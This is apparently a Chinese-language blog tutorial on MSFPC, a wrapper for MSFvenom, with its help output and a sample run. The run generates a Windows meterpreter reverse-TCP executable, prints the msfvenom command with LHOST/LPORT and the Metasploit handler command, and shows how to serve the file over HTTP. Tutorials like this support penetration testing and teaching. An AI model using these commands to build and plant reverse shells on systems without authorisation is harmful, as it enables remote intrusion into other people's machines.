

> 一般来说，生成payload的默认工具是MSFvenom，这是一个独立于Metasploit的payload生成器及编码器。虽然它是一个非常强大的payload生成神器，但是对于一些新手来说，可能难以在短时间内熟悉其操作。即使在进行最初的了解之后，生成一个基本的payload也需要输入相当多的内容，而今天，我们将看到使用MSFPC更便捷地生成paylaod。

> MSFPC，或者说是MSFvenom Payload生成器，其实是一个基于MSFvenom的Payload生成器，但是它旨在简化基本的有效载荷创建过程，用户使用MSFPC可以尽可能简单地创建Payload，有时甚至只需要一个参数！如果你以前使用过MSFvenom，那么可能已经自行编写了一个简单的shell脚本来自动化频繁地生成Payload。即使这样，这个工具也绝对值得一试。


### 安装:
```
apt-get install msfpc
```

### 帮助:
```bash
root@kali:~/proxychains-ng# msfpc -h
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

/usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
Example: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.
        /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
        /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
        /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
        /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
        /usr/bin/msfpc help verbose                # Help screen, with even more information.

 <TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]
......

```
### 使用:

```bash
root@kali:~/proxychains-ng# msfpc windows 192.168.48.144
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: 192.168.48.144
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=192.168.48.144 LPORT=443 \
  > '/root/proxychains-ng/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] windows meterpreter created: '/root/proxychains-ng/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/proxychains-ng/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/proxychains-ng/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
```

- [如何使用MSFPC简化生成Payload的过程](http://www.freebuf.com/sectool/153801.html)